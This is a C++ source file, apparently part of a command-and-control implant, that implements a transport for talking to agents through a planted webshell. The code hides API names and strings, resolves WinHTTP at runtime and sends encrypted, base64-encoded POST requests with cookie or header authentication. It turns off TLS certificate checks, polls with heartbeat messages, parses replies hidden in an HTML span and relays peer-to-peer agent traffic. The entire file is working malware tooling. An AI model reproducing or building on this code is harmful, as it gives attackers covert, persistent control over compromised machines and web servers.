#include <common.h>
#include <transport_webshell.h>
#include <config.h>
#include <package.h>
#include <parser.h>
#include <strings.h>
#include <base64.h>
#include <crypto.h>
#include <commands.h>

#if defined( INCLUDE_CMD_LINK_WEBSHELL ) || defined( INCLUDE_CMD_UNLINK_WEBSHELL )

using namespace stardust;
using namespace starburst;

auto declfn starburst::ws_resolve_winhttp(
    _Inout_ instance&          inst,
    _Out_   WebshellLinkState* state
) -> bool {
    if ( state->initialized ) return true;

    memory::zero( &state->http, sizeof( WebshellHttpApis ) );

    char dll_name[] = { 'w','i','n','h','t','t','p','.','d','l','l', 0 };
    state->h_winhttp = inst.kernel32.LoadLibraryA( dll_name );
    if ( !state->h_winhttp ) return false;

    state->http.pWinHttpOpen = reinterpret_cast<ws_fn_WinHttpOpen>(
        inst.kernel32.GetProcAddress( state->h_winhttp,
            symbol<char*>( const_cast<char*>( "WinHttpOpen" ) ) ) );
    state->http.pWinHttpConnect = reinterpret_cast<ws_fn_WinHttpConnect>(
        inst.kernel32.GetProcAddress( state->h_winhttp,
            symbol<char*>( const_cast<char*>( "WinHttpConnect" ) ) ) );
    state->http.pWinHttpOpenRequest = reinterpret_cast<ws_fn_WinHttpOpenRequest>(
        inst.kernel32.GetProcAddress( state->h_winhttp,
            symbol<char*>( const_cast<char*>( "WinHttpOpenRequest" ) ) ) );
    state->http.pWinHttpSendRequest = reinterpret_cast<ws_fn_WinHttpSendRequest>(
        inst.kernel32.GetProcAddress( state->h_winhttp,
            symbol<char*>( const_cast<char*>( "WinHttpSendRequest" ) ) ) );
    state->http.pWinHttpReceiveResponse = reinterpret_cast<ws_fn_WinHttpReceiveResponse>(
        inst.kernel32.GetProcAddress( state->h_winhttp,
            symbol<char*>( const_cast<char*>( "WinHttpReceiveResponse" ) ) ) );
    state->http.pWinHttpQueryDataAvailable = reinterpret_cast<ws_fn_WinHttpQueryDataAvailable>(
        inst.kernel32.GetProcAddress( state->h_winhttp,
            symbol<char*>( const_cast<char*>( "WinHttpQueryDataAvailable" ) ) ) );
    state->http.pWinHttpReadData = reinterpret_cast<ws_fn_WinHttpReadData>(
        inst.kernel32.GetProcAddress( state->h_winhttp,
            symbol<char*>( const_cast<char*>( "WinHttpReadData" ) ) ) );
    state->http.pWinHttpCloseHandle = reinterpret_cast<ws_fn_WinHttpCloseHandle>(
        inst.kernel32.GetProcAddress( state->h_winhttp,
            symbol<char*>( const_cast<char*>( "WinHttpCloseHandle" ) ) ) );
    state->http.pWinHttpSetOption = reinterpret_cast<ws_fn_WinHttpSetOption>(
        inst.kernel32.GetProcAddress( state->h_winhttp,
            symbol<char*>( const_cast<char*>( "WinHttpSetOption" ) ) ) );
    state->http.pWinHttpAddRequestHeaders = reinterpret_cast<ws_fn_WinHttpAddRequestHeaders>(
        inst.kernel32.GetProcAddress( state->h_winhttp,
            symbol<char*>( const_cast<char*>( "WinHttpAddRequestHeaders" ) ) ) );

    if ( !state->http.pWinHttpOpen || !state->http.pWinHttpConnect ||
         !state->http.pWinHttpOpenRequest || !state->http.pWinHttpSendRequest ||
         !state->http.pWinHttpReceiveResponse || !state->http.pWinHttpQueryDataAvailable ||
         !state->http.pWinHttpReadData || !state->http.pWinHttpCloseHandle ) {
        return false;
    }

    state->h_session = state->http.pWinHttpOpen(
        symbol<const wchar_t*>( L"Mozilla/5.0" ),
        WS_ACCESS_TYPE_DEFAULT_PROXY,
        nullptr, nullptr, 0
    );
    if ( !state->h_session ) return false;

    state->initialized = true;
    return true;
}

auto declfn starburst::ws_parse_url(
    _In_  const char* url,
    _Out_ WsParsedUrl* parsed
) -> bool {
    memory::zero( parsed, sizeof( WsParsedUrl ) );

    const char* p = url;

    if ( p[0] == 'h' && p[1] == 't' && p[2] == 't' && p[3] == 'p' ) {
        if ( p[4] == 's' ) {
            parsed->use_ssl = true;
            parsed->port    = WS_DEFAULT_HTTPS_PORT;
            p += 8; // skip "https://"
        } else {
            parsed->use_ssl = false;
            parsed->port    = WS_DEFAULT_HTTP_PORT;
            p += 7; // skip "http://"
        }
    } else {
        return false;
    }

    uint32_t hi = 0;
    while ( *p && *p != ':' && *p != '/' && hi < 255 ) {
        parsed->host[hi++] = *p++;
    }
    parsed->host[hi] = '\0';

    if ( *p == ':' ) {
        p++;
        uint16_t port = 0;
        while ( *p >= '0' && *p <= '9' ) {
            port = port * 10 + (*p - '0');
            p++;
        }
        parsed->port = port;
    }

    if ( *p == '/' ) {
        uint32_t pi = 0;
        while ( *p && pi < 511 ) {
            parsed->path[pi++] = *p++;
        }
        parsed->path[pi] = '\0';
    } else {
        parsed->path[0] = '/';
        parsed->path[1] = '\0';
    }

    return hi > 0;
}

static auto declfn ws_urlencode_b64(
    _Inout_ instance& inst,
    _In_    uint8_t*  b64_data,
    _In_    uint32_t  b64_len,
    _Out_   uint32_t* out_len
) -> uint8_t* {
    uint32_t extra = 0;
    for ( uint32_t i = 0; i < b64_len; i++ ) {
        if ( b64_data[i] == '+' || b64_data[i] == '/' || b64_data[i] == '=' )
            extra += 2;
    }

    uint32_t total = b64_len + extra;
    auto out = static_cast<uint8_t*>( inst.heap_alloc( total + 1 ) );
    if ( !out ) return nullptr;

    uint32_t j = 0;
    for ( uint32_t i = 0; i < b64_len; i++ ) {
        if ( b64_data[i] == '+' ) {
            out[j++] = '%'; out[j++] = '2'; out[j++] = 'B';
        } else if ( b64_data[i] == '/' ) {
            out[j++] = '%'; out[j++] = '2'; out[j++] = 'F';
        } else if ( b64_data[i] == '=' ) {
            out[j++] = '%'; out[j++] = '3'; out[j++] = 'D';
        } else {
            out[j++] = b64_data[i];
        }
    }
    out[j] = '\0';

    *out_len = j;
    return out;
}

static auto declfn ws_extract_span(
    _In_  uint8_t*  html,
    _In_  uint32_t  html_len,
    _Out_ uint8_t** content,
    _Out_ uint32_t* content_len
) -> bool {
    *content     = nullptr;
    *content_len = 0;

    // search for: <span id="r">
    char marker[] = { '<','s','p','a','n',' ','i','d','=','"','r','"','>', 0 };
    uint32_t marker_len = 13;

    uint8_t* start = nullptr;
    for ( uint32_t i = 0; i + marker_len <= html_len; i++ ) {
        bool match = true;
        for ( uint32_t k = 0; k < marker_len; k++ ) {
            if ( html[i + k] != static_cast<uint8_t>( marker[k] ) ) {
                match = false;
                break;
            }
        }
        if ( match ) {
            start = html + i + marker_len;
            break;
        }
    }
    if ( !start ) return false;

    // find closing </span>
    char close[] = { '<','/','s','p','a','n','>', 0 };
    uint32_t close_len = 7;
    uint32_t remaining = html_len - static_cast<uint32_t>( start - html );

    uint8_t* end = nullptr;
    for ( uint32_t i = 0; i + close_len <= remaining; i++ ) {
        bool match = true;
        for ( uint32_t k = 0; k < close_len; k++ ) {
            if ( start[i + k] != static_cast<uint8_t>( close[k] ) ) {
                match = false;
                break;
            }
        }
        if ( match ) {
            end = start + i;
            break;
        }
    }
    if ( !end ) return false;

    *content     = start;
    *content_len = static_cast<uint32_t>( end - start );
    return *content_len > 0;
}

auto declfn starburst::ws_http_post(
    _Inout_ instance&               inst,
    _In_    WebshellLinkState*       state,
    _In_    instance::WebshellLink*  link,
    _In_    uint8_t*                 data,
    _In_    uint32_t                 len,
    _Out_   uint8_t**                response,
    _Out_   uint32_t*                resp_len
) -> bool {
    *response = nullptr;
    *resp_len = 0;

    // encrypt if AES key is configured
    uint8_t* payload     = data;
    uint32_t payload_len = len;
    bool     encrypted   = false;

    if ( link->aes_key ) {
        uint8_t* enc = nullptr;
        uint32_t enc_len = 0;
        if ( !crypto_encrypt( inst, link->aes_key, data, len, &enc, &enc_len ) ) {
            DBG_PRINT( inst, "ws: encrypt failed\n" );
            return false;
        }
        payload     = enc;
        payload_len = enc_len;
        encrypted   = true;
    }

    // base64 encode
    uint32_t b64_len = 0;
    auto b64 = base64_encode( inst, payload, payload_len, &b64_len );
    if ( encrypted ) inst.heap_free( payload );
    if ( !b64 ) return false;

    // URL-encode the base64 for form POST
    uint32_t enc_val_len = 0;
    auto enc_val = ws_urlencode_b64( inst, b64, b64_len, &enc_val_len );
    inst.heap_free( b64 );
    if ( !enc_val ) return false;

    // build form body: param_name=encoded_value
    uint32_t pname_len = str_len( link->param_name );
    uint32_t body_len  = pname_len + 1 + enc_val_len; // name=value

    // if auth_method is parameter, append &auth_name=auth_value
    uint32_t auth_param_extra = 0;
    if ( link->auth_method == WS_AUTH_PARAMETER && link->auth_name && link->auth_value ) {
        auth_param_extra = 1 + str_len( link->auth_name ) + 1 + str_len( link->auth_value );
        body_len += auth_param_extra;
    }

    auto body = static_cast<uint8_t*>( inst.heap_alloc( body_len + 1 ) );
    if ( !body ) { inst.heap_free( enc_val ); return false; }

    uint32_t off = 0;
    memory::copy( body + off, link->param_name, pname_len ); off += pname_len;
    body[off++] = '=';
    memory::copy( body + off, enc_val, enc_val_len ); off += enc_val_len;

    if ( auth_param_extra > 0 ) {
        body[off++] = '&';
        uint32_t an_len = str_len( link->auth_name );
        memory::copy( body + off, link->auth_name, an_len ); off += an_len;
        body[off++] = '=';
        uint32_t av_len = str_len( link->auth_value );
        memory::copy( body + off, link->auth_value, av_len ); off += av_len;
    }
    body[off] = '\0';

    inst.heap_free( enc_val );

    // parse URL
    WsParsedUrl parsed;
    if ( !ws_parse_url( link->url, &parsed ) ) {
        inst.heap_free( body );
        return false;
    }

    // convert host and path to wide strings
    wchar_t wide_host[256] = {};
    inst.kernel32.MultiByteToWideChar( CP_ACP, 0, parsed.host, -1, wide_host, 256 );

    wchar_t wide_path[512] = {};
    inst.kernel32.MultiByteToWideChar( CP_ACP, 0, parsed.path, -1, wide_path, 512 );

    // connect
    auto h_conn = state->http.pWinHttpConnect(
        state->h_session, wide_host, parsed.port, 0 );
    if ( !h_conn ) {
        inst.heap_free( body );
        return false;
    }

    uint32_t req_flags = parsed.use_ssl ? WS_FLAG_SECURE : 0;
    auto h_req = state->http.pWinHttpOpenRequest(
        h_conn,
        symbol<const wchar_t*>( L"POST" ),
        wide_path,
        nullptr, nullptr, nullptr,
        req_flags
    );
    if ( !h_req ) {
        state->http.pWinHttpCloseHandle( h_conn );
        inst.heap_free( body );
        return false;
    }

    // ignore SSL cert errors
    if ( parsed.use_ssl && state->http.pWinHttpSetOption ) {
        uint32_t sec_flags = WS_SECURITY_IGNORE_UNKNOWN_CA |
                             WS_SECURITY_IGNORE_CERT_DATE |
                             WS_SECURITY_IGNORE_CERT_CN |
                             WS_SECURITY_IGNORE_CERT_USAGE;
        state->http.pWinHttpSetOption( h_req, WS_OPTION_SECURITY_FLAGS,
            &sec_flags, sizeof( sec_flags ) );
    }

    // Content-Type header
    if ( state->http.pWinHttpAddRequestHeaders ) {
        state->http.pWinHttpAddRequestHeaders( h_req,
            symbol<const wchar_t*>( L"Content-Type: application/x-www-form-urlencoded" ),
            static_cast<uint32_t>( -1 ),
            WS_ADDREQ_FLAG_ADD | WS_ADDREQ_FLAG_REPLACE );
    }

    // authentication headers (heap-allocated to avoid stack overflow)
    if ( link->auth_method == WS_AUTH_COOKIE && link->auth_name && link->auth_value ) {
        uint32_t an_len = str_len( link->auth_name );
        uint32_t av_len = str_len( link->auth_value );
        uint32_t hdr_len = 8 + an_len + 1 + av_len; // "Cookie: " + name + "=" + value
        auto hdr_buf = static_cast<char*>( inst.heap_alloc( hdr_len + 1 ) );
        if ( hdr_buf ) {
            str_copy( hdr_buf, symbol<char*>( const_cast<char*>( "Cookie: " ) ) );
            str_concat( hdr_buf, link->auth_name );
            str_concat( hdr_buf, symbol<char*>( const_cast<char*>( "=" ) ) );
            str_concat( hdr_buf, link->auth_value );
            auto wide_hdr = static_cast<wchar_t*>(
                inst.heap_alloc( ( hdr_len + 1 ) * sizeof( wchar_t ) ) );
            if ( wide_hdr ) {
                inst.kernel32.MultiByteToWideChar( CP_ACP, 0, hdr_buf, -1,
                    wide_hdr, hdr_len + 1 );
                state->http.pWinHttpAddRequestHeaders( h_req, wide_hdr,
                    static_cast<uint32_t>( -1 ),
                    WS_ADDREQ_FLAG_ADD | WS_ADDREQ_FLAG_REPLACE );
                inst.heap_free( wide_hdr );
            }
            inst.heap_free( hdr_buf );
        }
    } else if ( link->auth_method == WS_AUTH_HEADER && link->auth_name && link->auth_value ) {
        uint32_t an_len = str_len( link->auth_name );
        uint32_t av_len = str_len( link->auth_value );
        uint32_t hdr_len = an_len + 2 + av_len; // name + ": " + value
        auto hdr_buf = static_cast<char*>( inst.heap_alloc( hdr_len + 1 ) );
        if ( hdr_buf ) {
            str_copy( hdr_buf, link->auth_name );
            str_concat( hdr_buf, symbol<char*>( const_cast<char*>( ": " ) ) );
            str_concat( hdr_buf, link->auth_value );
            auto wide_hdr = static_cast<wchar_t*>(
                inst.heap_alloc( ( hdr_len + 1 ) * sizeof( wchar_t ) ) );
            if ( wide_hdr ) {
                inst.kernel32.MultiByteToWideChar( CP_ACP, 0, hdr_buf, -1,
                    wide_hdr, hdr_len + 1 );
                state->http.pWinHttpAddRequestHeaders( h_req, wide_hdr,
                    static_cast<uint32_t>( -1 ),
                    WS_ADDREQ_FLAG_ADD | WS_ADDREQ_FLAG_REPLACE );
                inst.heap_free( wide_hdr );
            }
            inst.heap_free( hdr_buf );
        }
    }

    // send request
    int sent = state->http.pWinHttpSendRequest(
        h_req, nullptr, 0,
        body, body_len, body_len, 0
    );
    inst.heap_free( body );

    if ( !sent ) {
        state->http.pWinHttpCloseHandle( h_req );
        state->http.pWinHttpCloseHandle( h_conn );
        return false;
    }

    if ( !state->http.pWinHttpReceiveResponse( h_req, nullptr ) ) {
        state->http.pWinHttpCloseHandle( h_req );
        state->http.pWinHttpCloseHandle( h_conn );
        return false;
    }

    // read response body
    uint8_t* resp_buf  = nullptr;
    uint32_t resp_size = 0;
    uint32_t resp_cap  = 0;

    while ( true ) {
        uint32_t available = 0;
        if ( !state->http.pWinHttpQueryDataAvailable( h_req, &available ) ) break;
        if ( available == 0 ) break;

        if ( resp_size + available > resp_cap ) {
            uint32_t nc = resp_cap == 0 ? 4096 : resp_cap;
            while ( nc < resp_size + available ) nc *= 2;
            auto tmp = static_cast<uint8_t*>( inst.heap_realloc( resp_buf, nc ) );
            if ( !tmp ) break;
            resp_buf = tmp;
            resp_cap = nc;
        }

        uint32_t read = 0;
        state->http.pWinHttpReadData( h_req, resp_buf + resp_size, available, &read );
        resp_size += read;
    }

    state->http.pWinHttpCloseHandle( h_req );
    state->http.pWinHttpCloseHandle( h_conn );

    if ( !resp_buf || resp_size == 0 ) return false;

    // extract content from <span id="r">...</span>
    uint8_t* span_data = nullptr;
    uint32_t span_len  = 0;

    if ( !ws_extract_span( resp_buf, resp_size, &span_data, &span_len ) ) {
        inst.heap_free( resp_buf );
        return false;
    }

    // base64 decode the span content
    uint32_t decoded_len = 0;
    auto decoded = base64_decode( inst, span_data, span_len, &decoded_len );
    inst.heap_free( resp_buf );

    if ( !decoded || decoded_len == 0 ) {
        if ( decoded ) inst.heap_free( decoded );
        return false;
    }

    // decrypt if AES key is configured
    if ( link->aes_key ) {
        uint8_t* plain     = nullptr;
        uint32_t plain_len = 0;

        if ( !crypto_decrypt( inst, link->aes_key, decoded, decoded_len, &plain, &plain_len ) ) {
            inst.heap_free( decoded );
            return false;
        }
        inst.heap_free( decoded );
        *response = plain;
        *resp_len = plain_len;
    } else {
        *response = decoded;
        *resp_len = decoded_len;
    }

    return true;
}

auto declfn starburst::ws_poll_links(
    _Inout_ instance& inst
) -> void {
    auto state = static_cast<WebshellLinkState*>( inst.webshell_link_state );
    if ( !state || !state->initialized ) return;

    auto cur = inst.webshell_links;
    while ( cur ) {
        auto next_link = cur->next;

        if ( !cur->connected ) {
            cur = next_link;
            continue;
        }

        // send poll_p2p|heartbeat
        char poll_cmd[] = { 'p','o','l','l','_','p','2','p','|','h','e','a','r','t','b','e','a','t', 0 };
        uint32_t poll_len = 18;

        uint8_t* resp     = nullptr;
        uint32_t resp_len = 0;

        if ( !ws_http_post( inst, state, cur,
                reinterpret_cast<uint8_t*>( poll_cmd ), poll_len,
                &resp, &resp_len ) ) {
            cur = next_link;
            continue;
        }

        // response format: 0|poll|<p2p_data> or 0|poll| (empty)
        // find third pipe to locate p2p_data
        if ( resp && resp_len > 0 ) {
            uint32_t pipes = 0;
            uint32_t data_start = 0;
            for ( uint32_t i = 0; i < resp_len; i++ ) {
                if ( resp[i] == '|' ) {
                    pipes++;
                    if ( pipes == 2 ) {
                        data_start = i + 1;
                        break;
                    }
                }
            }

            uint32_t p2p_len = ( data_start > 0 && data_start < resp_len )
                ? resp_len - data_start : 0;

            if ( p2p_len > 0 ) {
                uint8_t* p2p_data = resp + data_start;

                // update agent_id if UUID changed (checkin|<uuid>|...)
                if ( p2p_len > 8 && cur->agent_id ) {
                    uint32_t fp = 0;
                    bool ff = false;
                    for ( uint32_t i = 0; i < p2p_len; i++ ) {
                        if ( p2p_data[i] == '|' ) { fp = i + 1; ff = true; break; }
                    }
                    if ( ff && fp < p2p_len ) {
                        uint32_t sp = p2p_len;
                        for ( uint32_t i = fp; i < p2p_len; i++ ) {
                            if ( p2p_data[i] == '|' ) { sp = i; break; }
                        }
                        uint32_t ul = sp - fp;
                        if ( ul == 36 ) {
                            bool diff = false;
                            for ( uint32_t i = 0; i < 36; i++ ) {
                                if ( cur->agent_id[i] !=
                                     static_cast<char>( p2p_data[fp + i] ) ) {
                                    diff = true;
                                    break;
                                }
                            }
                            if ( diff ) {
                                auto nid = static_cast<char*>(
                                    inst.heap_alloc( 37 ) );
                                if ( nid ) {
                                    memory::copy( nid, p2p_data + fp, 36 );
                                    nid[36] = 0;
                                    inst.heap_free( cur->agent_id );
                                    cur->agent_id = nid;
                                }
                            }
                        }
                    }
                }

                auto dpkg = package_create( inst );
                if ( dpkg ) {
                    package_add_byte( inst, dpkg, ACTION_LINK_MSG );
                    package_add_string( inst, dpkg, cur->agent_id ?
                        cur->agent_id : symbol<char*>( const_cast<char*>( "" ) ) );
                    package_add_bytes( inst, dpkg, p2p_data, p2p_len );

                    uint32_t dlen = 0;
                    auto ddata = package_build( dpkg, &dlen );

                    uint32_t needed = inst.response_queue.length + 4 + dlen;
                    if ( needed > inst.response_queue.capacity ) {
                        uint32_t nc = inst.response_queue.capacity == 0
                            ? 1024 : inst.response_queue.capacity;
                        while ( nc < needed ) nc *= 2;
                        auto tmp = static_cast<uint8_t*>(
                            inst.heap_realloc( inst.response_queue.buffer, nc ) );
                        if ( tmp ) {
                            inst.response_queue.buffer   = tmp;
                            inst.response_queue.capacity = nc;
                        }
                    }
                    if ( inst.response_queue.length + 4 + dlen <=
                         inst.response_queue.capacity ) {
                        auto qb = inst.response_queue.buffer +
                            inst.response_queue.length;
                        qb[0] = (dlen >> 24) & 0xFF;
                        qb[1] = (dlen >> 16) & 0xFF;
                        qb[2] = (dlen >> 8)  & 0xFF;
                        qb[3] = dlen & 0xFF;
                        memory::copy( qb + 4, ddata, dlen );
                        inst.response_queue.length += 4 + dlen;
                    }

                    package_destroy( inst, dpkg );
                }
            }

            inst.heap_free( resp );
        }

        cur = next_link;
    }
}

auto declfn starburst::ws_link_send_msg(
    _Inout_ instance&               inst,
    _In_    instance::WebshellLink*  link,
    _In_    uint8_t*                 data,
    _In_    uint32_t                 len
) -> bool {
    auto state = static_cast<WebshellLinkState*>( inst.webshell_link_state );
    if ( !state || !state->initialized ) return false;

    uint8_t* resp     = nullptr;
    uint32_t resp_len = 0;

    bool ok = ws_http_post( inst, state, link, data, len, &resp, &resp_len );

    // any response from the webshell is queued back as delegate data
    if ( ok && resp && resp_len > 0 ) {
        // check for non-empty response (not just "0|poll|")
        bool has_data = false;
        if ( resp_len > 7 ) {
            has_data = true;
        } else {
            for ( uint32_t i = 0; i < resp_len; i++ ) {
                if ( resp[i] != '0' && resp[i] != '|' ) {
                    has_data = true;
                    break;
                }
            }
        }

        if ( has_data ) {
            auto dpkg = package_create( inst );
            if ( dpkg ) {
                package_add_byte( inst, dpkg, ACTION_LINK_MSG );
                package_add_string( inst, dpkg, link->agent_id ?
                    link->agent_id : symbol<char*>( const_cast<char*>( "" ) ) );
                package_add_bytes( inst, dpkg, resp, resp_len );

                uint32_t dlen = 0;
                auto ddata = package_build( dpkg, &dlen );

                uint32_t needed = inst.response_queue.length + 4 + dlen;
                if ( needed > inst.response_queue.capacity ) {
                    uint32_t nc = inst.response_queue.capacity == 0
                        ? 1024 : inst.response_queue.capacity;
                    while ( nc < needed ) nc *= 2;
                    auto tmp = static_cast<uint8_t*>(
                        inst.heap_realloc( inst.response_queue.buffer, nc ) );
                    if ( tmp ) {
                        inst.response_queue.buffer   = tmp;
                        inst.response_queue.capacity = nc;
                    }
                }
                if ( inst.response_queue.length + 4 + dlen <=
                     inst.response_queue.capacity ) {
                    auto qb = inst.response_queue.buffer +
                        inst.response_queue.length;
                    qb[0] = (dlen >> 24) & 0xFF;
                    qb[1] = (dlen >> 16) & 0xFF;
                    qb[2] = (dlen >> 8)  & 0xFF;
                    qb[3] = dlen & 0xFF;
                    memory::copy( qb + 4, ddata, dlen );
                    inst.response_queue.length += 4 + dlen;
                }

                package_destroy( inst, dpkg );
            }
        }
    }

    if ( resp ) inst.heap_free( resp );
    return ok;
}

#endif
